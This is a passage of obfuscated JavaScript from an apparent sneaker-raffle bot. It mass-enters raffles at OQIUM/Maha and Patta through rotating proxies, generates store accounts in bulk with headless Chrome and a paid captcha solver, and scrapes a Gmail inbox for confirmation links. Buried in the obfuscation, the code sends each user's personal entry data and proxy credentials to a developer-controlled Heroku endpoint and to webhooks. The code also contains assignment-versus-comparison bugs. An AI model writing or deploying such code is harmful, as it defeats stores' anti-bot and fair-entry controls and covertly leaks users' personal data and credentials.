                                _0x67c453['data']['attributes']['properties']['$first_name'] = '' + _0x5a0755[_0x4f9a03]['FirstName'], _0x67c453['data']['attributes']['properties']['$last_name'] = '' + _0x5a0755[_0x4f9a03]['LastName'], _0x67c453['data']['attributes']['properties']['$address1'] = _0x5a0755[_0x4f9a03]['Address1'] + '\x20' + _0x5a0755[_0x4f9a03]['Address2'] + '\x20' + _0x5a0755[_0x4f9a03]['HouseNumber'], _0x67c453['data']['attributes']['properties']['$zip'] = '' + _0x5a0755[_0x4f9a03]['Zip'], _0x67c453['data']['attributes']['properties']['$city'] = '' + _0x5a0755[_0x4f9a03]['City'], _0x67c453['data']['attributes']['properties']['$country'] = '' + _0x5a0755[_0x4f9a03]['Country'], _0x5a0755[_0x4f9a03]['Size'] == 'RANDOM' ? _0x67c453['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x45d44e[_0x1c25b6] : _0x67c453['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x5a0755[_0x4f9a03]['Size'], _0x67c453['data']['attributes']['properties']['$phone_number'] = '' + _0x5a0755[_0x4f9a03]['Phone'], _0x67c453['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x5a0755[_0x4f9a03]['Follower'];
                            }
                            if (_0x263298['useRandomProxy'] = ![])
                                var _0xafd80e = _0x194cd9[_0x4f9a03]['split'](':');
                            else
                                var _0x4538bf = Math['round'](Math['random']() * (_0x194cd9['length'] - 0x1)), _0xafd80e = _0x194cd9[_0x4538bf]['split'](':');
                            var _0x56fd2c = {
                                'jar': _0x57be51,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x2970e9['url'],
                                'headers': _0x2970e9['headers'],
                                'body': JSON['stringify'](_0x67c453),
                                'proxy': 'http://' + _0xafd80e[0x2] + ':' + _0xafd80e[0x3] + '@' + _0xafd80e[0x0] + ':' + _0xafd80e[0x1]
                            };
                            return _0x47e9f0 != 'ver' && (_0x56fd2c['url'] = _0x2970e9['url'], _0x56fd2c['headers'] = _0x2970e9['headers']), _0x47e9f0 == 'ver' && (_0x56fd2c['method'] = 'GET'), new Promise(function (_0x272cb7, _0x1ddebb) {
                                callback = async (_0x313416, _0xc6b9f7, _0x44bac3) => {
                                    if (!_0x313416 && _0xc6b9f7['statusCode'] == 0xca || !_0x313416 && _0xc6b9f7['statusCode'] == 0xc8) {
                                        if (_0x47e9f0 != 'ver') {
                                            var _0x253719 = await _0x22ebf6(_0x5a0755[_0x4f9a03], _0x2970e9, 'dev', ![]), _0x5bb191 = await _0x22ebf6(_0x5a0755[_0x4f9a03], _0x2970e9, 'pub', ![]);
                                            const _0x27e313 = {
                                                'succesDEVMSG': { 'embeds': [_0x253719] },
                                                'succesPUBMSG': { 'embeds': [_0x5bb191] }
                                            };
                                            let _0x1072cc = _0x5a0755[_0x4f9a03];
                                            try {
                                                prxdata = {
                                                    'username': _0x100f6f['replace']('#', ''),
                                                    'module': _0x2970e9['name'],
                                                    'entrydata': JSON['stringify'](_0x1072cc),
                                                    'proxy': '' + _0x194cd9[_0x4f9a03]
                                                };
                                                var _0x136906 = JSON['stringify'](prxdata);
                                                let _0x2cc620 = { 'headers': { 'content-type': 'application/json' } };
                                                await _0x4a5c70['post']('https://jraffles.herokuapp.com/success', _0x136906, _0x2cc620);
                                            } catch (_0x548ba3) {
                                            }
                                            if (_0x263298['webhook'] != undefined && _0x263298['webhook'] != '')
                                                try {
                                                    await _0x1cac9f(_0x263298['webhook'], _0x27e313['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x9175f4(0xc8), await _0x1cac9f(_0x48f5f5, _0x27e313['succesDEVMSG']), await _0x9175f4(0xc8);
                                            try {
                                                await _0x1cac9f(_0x2f03c2, _0x27e313['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x3e2f6d(_0x5a0755[_0x4f9a03], _0x2970e9);
                                        }
                                        _0x272cb7(console['log'](_0x561058['green'](_0x1500d7() + '\x20[' + _0x2970e9['name'] + ']\x20Task\x20' + (_0x4f9a03 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x47e9f0 != 'ver') {
                                            var _0x449f72 = '' + _0x313416, _0x2241a3 = await _0x22ebf6(_0x5a0755[_0x4f9a03], _0x2970e9, 'dev', !![], _0x449f72), _0x3911b0 = {};
                                            _0x3911b0['errorDEV'] = { 'embeds': [_0x2241a3] }, _0x194f3c(_0x5a0755[_0x4f9a03], _0x2970e9), _0x263298['webhook'] != undefined && _0x263298['webhook'] != '' && await _0x1cac9f(_0x263298['webhook'], _0x3911b0['errorDEV']), await _0x1cac9f(_0x569bf6, _0x3911b0['errorDEV']);
                                        }
                                        _0x1ddebb(console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0x2970e9['name'] + ']\x20Task\x20' + (_0x4f9a03 + 0x1) + ':\x20' + _0x313416)));
                                    }
                                };
                                try {
                                    _0x47e9f0 != 'ver' && console['log'](_0x1500d7() + '\x20[' + _0x2970e9['name'] + ']\x20Task\x20' + (_0x4f9a03 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x67c453['data']['attributes']['email']), _0x44d2d2(_0x56fd2c, callback);
                                } catch (_0xfe9bee) {
                                    console['log'](_0x1500d7() + '\x20Task\x20' + (_0x4f9a03 + 0x1) + ':\x20' + _0xfe9bee);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x3dc1b8(_0x12f9da, 'nor', _0x21d368, _0x411890, _0x17ef37), console['log'](_0x1500d7() + '\x20[' + _0x21d368['name'] + ']\x20Sleeping\x20for\x20' + _0x263298['delay'] + '\x20ms'), await _0x9175f4(_0x263298['delay']);
                        } catch (_0x4c673e) {
                        }
                    }
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x37bbfe, _0x25b577, _0x34f4ae) {
                    var _0x25b577 = [], _0x4d646e = ![];
                    async function _0x3d733c() {
                        var _0x551a97 = new _0x518654({
                            'user': _0x263298['masterMail'],
                            'password': _0x263298['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0xfa2868(_0x322df1) {
                            _0x551a97['openBox']('INBOX', ![], _0x322df1);
                        }
                        _0x551a97['once']('ready', function () {
                            _0xfa2868(function (_0x3badeb, _0x1aa070) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x3badeb)
                                    throw _0x3badeb;
                                _0x551a97['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ],
                                    [
                                        'FROM',
                                        'OQIUM'
                                    ]
                                ], function (_0x3eeebe, _0x3f8ce6) {
                                    if (!_0x3f8ce6 || !_0x3f8ce6['length'])
                                        console['log'](_0x1500d7() + '\x20[' + _0x37bbfe['name'] + ']\x20No\x20mails\x20found'), _0x551a97['end']();
                                    else {
                                        var _0xc4e291 = _0x551a97['seq']['fetch'](_0x3f8ce6, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0xc4e291['on']('message', function (_0x4ce7b0, _0x49a7a3) {
                                            var _0x13427d = '(#' + _0x49a7a3 + ')\x20';
                                            _0x4ce7b0['on']('body', function (_0x538dc0, _0x24a24a) {
                                                _0x504fd9(_0x538dc0, (_0x11162c, _0x29b36c) => {
                                                    var _0x2695ba = _0x29b36c['text']['split']('(')[0x1], _0x46370a = _0x2695ba['split'](')')[0x0];
                                                    _0x25b577['push'](_0x46370a);
                                                });
                                            }), _0x4ce7b0['once']('end', function () {
                                            });
                                        }), _0xc4e291['once']('error', function (_0xb8a92f) {
                                            console['log']('Fetch\x20error:\x20' + _0xb8a92f), _0x4d646e = !![];
                                        }), _0xc4e291['once']('end', function () {
                                            _0x551a97['end'](), _0x4d646e = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x551a97['once']('error', function (_0x586cde) {
                            console['log'](_0x586cde), _0x4d646e = !![];
                        }), _0x551a97['once']('end', async function () {
                            _0x4d646e = !![];
                        }), _0x551a97['connect']();
                    }
                    async function _0x5330c2(_0x2657b8, _0x258c9e, _0x36ce53) {
                        for (var _0x138e0b = 0x0; _0x138e0b < _0x258c9e['length']; _0x138e0b++) {
                            async function _0x3b7d05(_0x411c4d, _0xebea07, _0x33c341, _0x5d9ddd, _0x75f66f) {
                                var _0x11e29a, _0x4d6f81 = {}, _0x1c9a5f = [], _0x349374 = {}, _0x47a36a = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x34683d = Math['round'](Math['random']() * (_0x47a36a['length'] - 0x1));
                                _0x5d9ddd[_0x411c4d]['Size'] == 'RANDOM' && (_0x5d9ddd[_0x411c4d]['Size'] = _0x47a36a[_0x34683d]);
                                !_0x5d9ddd && (_0x5d9ddd = {});
                                if (_0x263298['useRandomProxy'] = ![])
                                    var _0x331d49 = _0x75f66f[_0x411c4d]['split'](':');
                                else
                                    var _0x250fa2 = Math['round'](Math['random']() * (_0x75f66f['length'] - 0x1)), _0x331d49 = _0x75f66f[_0x250fa2]['split'](':');
                                var _0x50b0a9 = {
                                    'jar': _0x57be51,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x33c341['url'],
                                    'headers': _0x33c341['headers'],
                                    'body': JSON['stringify'](_0x4d6f81),
                                    'proxy': 'http://' + _0x331d49[0x2] + ':' + _0x331d49[0x3] + '@' + _0x331d49[0x0] + ':' + _0x331d49[0x1]
                                };
                                return _0xebea07 != 'ver' && (_0x50b0a9['url'] = _0x33c341['url'], _0x50b0a9['headers'] = _0x33c341['headers']), _0xebea07 == 'ver' && (_0x50b0a9['method'] = 'GET', _0x50b0a9['url'] = _0x5d9ddd[_0x411c4d]), new Promise(function (_0x262d10, _0x5436a2) {
                                    callback = async (_0xbdcf81, _0x2178b8, _0x53558f) => {
                                        if (!_0xbdcf81 && _0x2178b8['statusCode'] == 0xca || !_0xbdcf81 && _0x2178b8['statusCode'] == 0xc8) {
                                            if (_0xebea07 != 'ver') {
                                                var _0x4edd84 = await _0x22ebf6(_0x5d9ddd[_0x411c4d], _0x33c341, 'dev', ![]), _0x54ece9 = await _0x22ebf6(_0x5d9ddd[_0x411c4d], _0x33c341, 'pub', ![]);
                                                const _0x2ea429 = {
                                                    'succesDEVMSG': { 'embeds': [_0x4edd84] },
                                                    'succesPUBMSG': { 'embeds': [_0x54ece9] }
                                                };
                                                if (_0x263298['webhook'] != undefined && _0x263298['webhook'] != '')
                                                    try {
                                                        await _0x1cac9f(_0x263298['webhook'], _0x2ea429['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x9175f4(0xc8), await _0x1cac9f(_0x48f5f5, _0x2ea429['succesDEVMSG']), await _0x9175f4(0xc8);
                                                try {
                                                    await _0x1cac9f(_0x2f03c2, _0x2ea429['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x3e2f6d(_0x5d9ddd[_0x411c4d], _0x33c341);
                                            }
                                            _0x262d10(console['log'](_0x561058['green'](_0x1500d7() + '\x20[' + _0x33c341['name'] + ']\x20Task\x20' + (_0x411c4d + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0xebea07 != 'ver') {
                                                var _0x468d82 = '' + _0xbdcf81, _0x31ab36 = await _0x22ebf6(_0x5d9ddd[_0x411c4d], _0x33c341, 'dev', !![], _0x468d82), _0x26ce0f = {};
                                                _0x26ce0f['errorDEV'] = { 'embeds': [_0x31ab36] }, _0x194f3c(_0x5d9ddd[_0x411c4d], _0x33c341), _0x263298['webhook'] != undefined && _0x263298['webhook'] != '' && await _0x1cac9f(_0x263298['webhook'], _0x26ce0f['errorDEV']), await _0x1cac9f(_0x569bf6, _0x26ce0f['errorDEV']);
                                            }
                                            _0x5436a2(console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0x33c341['name'] + ']\x20Task\x20' + (_0x411c4d + 0x1) + ':\x20' + _0xbdcf81)));
                                        }
                                    };
                                    try {
                                        _0xebea07 != 'ver' ? console['log'](_0x1500d7() + '\x20[' + _0x33c341['name'] + ']\x20Task\x20' + (_0x411c4d + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x4d6f81['data']['attributes']['email']) : console['log'](_0x1500d7() + '\x20[' + _0x33c341['name'] + ']\x20Task\x20' + (_0x411c4d + 0x1) + ':\x20Fetching\x20Response'), _0x44d2d2(_0x50b0a9, callback);
                                    } catch (_0x39f8e6) {
                                        console['log'](_0x1500d7() + '\x20Task\x20' + (_0x411c4d + 0x1) + ':\x20' + _0x39f8e6);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x3b7d05(_0x138e0b, 'ver', _0x2657b8, _0x258c9e, _0x36ce53), console['log'](_0x1500d7() + '\x20[' + _0x2657b8['name'] + ']\x20Sleeping\x20for\x20' + _0x263298['delay'] + '\x20ms'), await _0x9175f4(_0x263298['delay']);
                            } catch (_0x2ec774) {
                            }
                        }
                    }
                    try {
                        _0x3d733c();
                        while (!_0x4d646e) {
                            await _0x9175f4(0xfa0);
                        }
                        console['log']('Found\x20' + _0x25b577['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x5330c2(_0x37bbfe, _0x25b577, _0x34f4ae);
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0xb9e448, _0x2f9da6, _0x54dc4f) {
                    _0x45f1d0['use'](_0x49d897()), _0x45f1d0['use'](_0x5ae7c2({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x263298['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x4a8660 = 0x0; _0x4a8660 < _0x2f9da6['length']; _0x4a8660++) {
                        var _0x50e57d = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x100f6f
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x263298['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x5ab5b1
                                }
                            ]
                        }];
                        const _0x4bfdfc = { 'embeds': _0x50e57d };
                        _0x73a448(_0xb9e448['name'] + '\x20Task\x20' + (_0x4a8660 + 0x1) + '\x20/\x20' + _0x2f9da6['length'] + '\x20||\x20File:\x20' + _0x45373f + '\x20Proxies:\x20' + _0x362291);
                        try {
                            await _0x5c0aeb(_0x2f9da6, _0x4a8660);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x4ce366 = await _0x22ebf6(_0x2f9da6[_0x4a8660], _0xb9e448, 'acc', ![]);
                        const _0x33726c = { 'succesDEVMSG': { 'embeds': [_0x4ce366] } };
                        if (_0x2f9da6[_0x4a8660]['Email'] == '' || _0x2f9da6[_0x4a8660]['FirstName'] == '' || _0x2f9da6[_0x4a8660]['LastName'] == '') {
                            console['log'](_0x1500d7() + '\x20[' + _0x16913c[taskModule]['name'] + ']\x20Task\x20' + (_0x4a8660 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x9175f4(0x7d0);
                            continue;
                        }
                        (_0x2f9da6[_0x4a8660]['Password'] == '' || _0x2f9da6[_0x4a8660] == undefined) && _0x2f9da6[_0x4a8660]['Password'] == 'JRaffles23!';
                        if (_0x263298['useRandomProxy'] = ![])
                            var _0x3c0bde = _0x54dc4f[_0x4a8660]['split'](':');
                        else
                            var _0x17562d = Math['round'](Math['random']() * (_0x54dc4f['length'] - 0x1)), _0x3c0bde = _0x54dc4f[_0x17562d]['split'](':');
                        var _0x52c6a4;
                        try {
                            _0x52c6a4 = await _0x45f1d0['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3c0bde[0x0] + ':' + _0x3c0bde[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x52c6a4 = await _0x45f1d0['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3c0bde[0x0] + ':' + _0x3c0bde[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x372564 = await _0x52c6a4['newPage']();
                            await _0x372564['authenticate']({
                                'username': '' + _0x3c0bde[0x2],
                                'password': '' + _0x3c0bde[0x3]
                            }), console['log'](_0x1500d7() + '\x20[' + _0xb9e448['name'] + ']\x20Task\x20' + (_0x4a8660 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x372564['setRequestInterception'](!![]), _0x372564['on']('request', _0x70b23c => {
                                _0x70b23c['resourceType']() === 'image' || _0x70b23c['resourceType']() === 'font' || _0x70b23c['resourceType']() === 'media' ? _0x70b23c['abort']() : _0x70b23c['continue']();
                            }), await _0x372564['goto']('https://patta.nl/account/register'), await _0x9175f4(0xbb8), await _0x372564['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x1500d7() + '\x20[' + _0xb9e448['name'] + ']\x20Task\x20' + (_0x4a8660 + 0x1) + '\x20:\x20Filling\x20information'), await _0x372564['type']('#RegisterForm-FirstName', '' + _0x2f9da6[_0x4a8660]['FirstName']), await _0x9175f4(0x226), await _0x372564['type']('#RegisterForm-LastName', '' + _0x2f9da6[_0x4a8660]['LastName']), await _0x9175f4(0x226), await _0x372564['type']('#RegisterForm-email', '' + _0x2f9da6[_0x4a8660]['Email']), await _0x9175f4(0x226), await _0x372564['type']('#RegisterForm-password', '' + _0x2f9da6[_0x4a8660]['Password']), await _0x9175f4(0x226), console['log'](_0x1500d7() + '\x20[' + _0xb9e448['name'] + ']\x20Task\x20' + (_0x4a8660 + 0x1) + '\x20:\x20Submitting..'), await _0x372564['$eval']('#RegisterForm', _0x453385 => _0x453385['submit']()), await _0x9175f4(0x1f40);
                            try {
                                await _0x372564['waitForSelector']('.home-page-grid__collection'), await _0x9175f4(0x1f4), console['log'](_0x561058['green'](_0x1500d7() + '\x20[' + _0xb9e448['name'] + ']\x20Task\x20' + (_0x4a8660 + 0x1) + '\x20:\x20Account\x20' + _0x2f9da6[_0x4a8660]['Email'] + '\x20Generated!')), _0x1ed524['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x2f9da6[_0x4a8660]['Email'] + ',' + _0x2f9da6[_0x4a8660]['Password']), console['log'](_0x561058['yellow'](_0x1500d7() + '\x20[' + _0xb9e448['name'] + ']\x20Task\x20' + (_0x4a8660 + 0x1) + '\x20:\x20Account\x20' + _0x2f9da6[_0x4a8660]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                try {
                                    _0x263298['webhook'] != undefined && _0x263298['webhook'] != '' && await _0x1cac9f(_0x263298['webhook'], _0x33726c['succesDEVMSG']);
                                } catch {
                                }
                                await _0x1cac9f(_0x515b29, _0x33726c['succesDEVMSG']);
                            } catch (_0x521eca) {
                                console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0x16913c[taskModule]['name'] + ']\x20Task\x20' + (_0x4a8660 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x521eca));
                            }
                        } catch (_0x42fe33) {
                            console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0x16913c[taskModule]['name'] + ']\x20Task\x20' + (_0x4a8660 + 0x1) + '\x20:\x20' + _0x42fe33));
                        } finally {
                            _0x52c6a4 && _0x52c6a4['close'](), console['log']('Waiting\x20for\x20' + _0x263298['delay'] + '\x20ms'), await _0x9175f4(_0x263298['delay']);
                        }
                    }
                }
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x3b672d, _0x82b370, _0x4bed5f) {
                    _0x45f1d0['use'](_0x49d897()), _0x45f1d0['use'](_0x5ae7c2({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x263298['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x5ba545 = 0x0; _0x5ba545 < _0x82b370['length']; _0x5ba545++) {
                        var _0x5197d3;
                        if (_0x5412b7 != 'yes')
                            var _0x5412b7 = '', _0x24b6e0 = 0x0;
                        _0x73a448(_0x3b672d['name'] + '\x20Task\x20' + (_0x5ba545 + 0x1) + '\x20/\x20' + _0x82b370['length'] + '\x20||\x20File:\x20' + _0x45373f + '\x20Proxies:\x20' + _0x362291);
                        try {
                            await _0x5c0aeb(_0x82b370, _0x5ba545);
                        } catch {
                            _0x5412b7 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x82b370[_0x5ba545]['Email'] == '' || _0x82b370[_0x5ba545]['Password'] == '' || _0x82b370[_0x5ba545]['FirstName'] == '' || _0x82b370[_0x5ba545]['LastName'] == '') {
                            console['log'](_0x1500d7() + '\x20[' + _0x16913c[taskModule]['name'] + ']\x20Task\x20' + (_0x5ba545 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x263298['useRandomProxy'] = ![])
                            var _0x29fa78 = _0x4bed5f[_0x5ba545]['split'](':');
                        else
                            var _0x372767 = Math['round'](Math['random']() * (_0x4bed5f['length'] - 0x1)), _0x29fa78 = _0x4bed5f[_0x372767]['split'](':');
                        var _0x44b5ef;
                        try {
                            _0x44b5ef = await _0x45f1d0['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x29fa78[0x0] + ':' + _0x29fa78[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x44b5ef = await _0x45f1d0['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x29fa78[0x0] + ':' + _0x29fa78[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x33a8e1 = await _0x44b5ef['newPage']();
                            await _0x33a8e1['authenticate']({
                                'username': '' + _0x29fa78[0x2],
                                'password': '' + _0x29fa78[0x3]
                            }), console['log'](_0x1500d7() + '\x20[' + _0x3b672d['name'] + ']\x20Task\x20' + (_0x5ba545 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x33a8e1['setRequestInterception'](!![]), _0x33a8e1['on']('request', _0x567e08 => {
                                _0x567e08['resourceType']() === 'image' || _0x567e08['resourceType']() === 'font' || _0x567e08['resourceType']() === 'media' ? _0x567e08['abort']() : _0x567e08['continue']();
                            }), await _0x33a8e1['goto']('https://www.patta.nl/nl/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x33a8e1['waitForSelector']('#CustomerEmail'), console['log'](_0x1500d7() + '\x20[' + _0x3b672d['name'] + ']\x20Task\x20' + (_0x5ba545 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x33a8e1['type']('#CustomerEmail', '' + _0x82b370[_0x5ba545]['Email']), await _0x9175f4(0x12c), await _0x33a8e1['type']('#CustomerPassword', '' + _0x82b370[_0x5ba545]['Password']), await _0x9175f4(0x226), await _0x33a8e1['$eval']('#customer_login', _0x5288be => _0x5288be['submit']());
                            try {
                                await _0x33a8e1['waitForSelector']('#orders'), await _0x9175f4(0x4b0);
                            } catch {
                                console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0x3b672d['name'] + ']\x20Task\x20' + (_0x5ba545 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x33a8e1['goto']('' + _0x82b370[_0x5ba545]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x9175f4(0xbb8), console['log'](_0x1500d7() + '\x20[' + _0x3b672d['name'] + ']\x20Task\x20' + (_0x5ba545 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x33a8e1['waitForSelector']('#email');
                            } catch {
                                console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0x3b672d['name'] + ']\x20Task\x20' + (_0x5ba545 + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                            }
                            await _0x33a8e1['type']('#email', '' + _0x82b370[_0x5ba545]['Email']), await _0x9175f4(0x384), await _0x33a8e1['type']('#first_name', '' + _0x82b370[_0x5ba545]['FirstName']), await _0x9175f4(0x514), await _0x33a8e1['type']('#last_name', '' + _0x82b370[_0x5ba545]['LastName']), await _0x9175f4(0x514), await _0x33a8e1['type']('#street_address', _0x82b370[_0x5ba545]['Address1'] + '\x20' + _0x82b370[_0x5ba545]['HouseNumber'] + '\x20' + _0x82b370[_0x5ba545]['Address2']), await _0x9175f4(0x2bc);
                            _0x82b370[_0x5ba545]['Postcode'] == undefined && (_0x82b370[_0x5ba545]['Postcode'] = _0x82b370[_0x5ba545]['Zip']);
                            await _0x33a8e1['type']('#zip_code', '' + _0x82b370[_0x5ba545]['Postcode']), await _0x9175f4(0x320), await _0x33a8e1['type']('#city', '' + _0x82b370[_0x5ba545]['City']), await _0x9175f4(0x320), await _0x33a8e1['type']('#bday', '01/01/1994'), await _0x9175f4(0x320), await _0x33a8e1['type']('#instagram', '' + _0x82b370[_0x5ba545]['Follower']), await _0x9175f4(0x352);
                            if (_0x82b370[_0x5ba545]['Size'] == 'RANDOM') {
                                const _0x2bd5a6 = await _0x33a8e1['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x24abf4 => {
                                    return _0x24abf4['map'](_0x45fbea => _0x45fbea['textContent']);
                                });
                                var _0x4195b2 = Math['round'](Math['random']() * (_0x2bd5a6['length'] - 0x1));
                                console['log'](_0x1500d7() + '\x20[' + _0x3b672d['name'] + ']\x20Task\x20' + (_0x5ba545 + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x2bd5a6[_0x4195b2]), await _0x33a8e1['click']('label[data-eu-size=\x22' + _0x2bd5a6[_0x4195b2] + '\x22]');
                            } else {
                                console['log'](_0x1500d7() + '\x20[' + _0x3b672d['name'] + ']\x20Task\x20' + (_0x5ba545 + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x82b370[_0x5ba545]['Size']);
                                try {
                                    await _0x33a8e1['click']('label[data-eu-size=\x22' + _0x82b370[_0x5ba545]['Size'] + '\x22]');
                                } catch {
                                    await _0x33a8e1['click']('label[data-eu-size=\x22' + _0x82b370[_0x5ba545]['Size'] + '.0\x22]');
                                }
                            }
                            await _0x9175f4(0xbb8), await _0x33a8e1['$$eval']('.raffle__checkbox-label', _0x4a262e => _0x4a262e['forEach'](_0x5e8314 => _0x5e8314['click']())), await _0x9175f4(0x7d0), console['log'](_0x1500d7() + '\x20[' + _0x3b672d['name'] + ']\x20Task\x20' + (_0x5ba545 + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x33a8e1['click']('#raffle__form-submit'), await _0x9175f4(0x1388);
                            try {
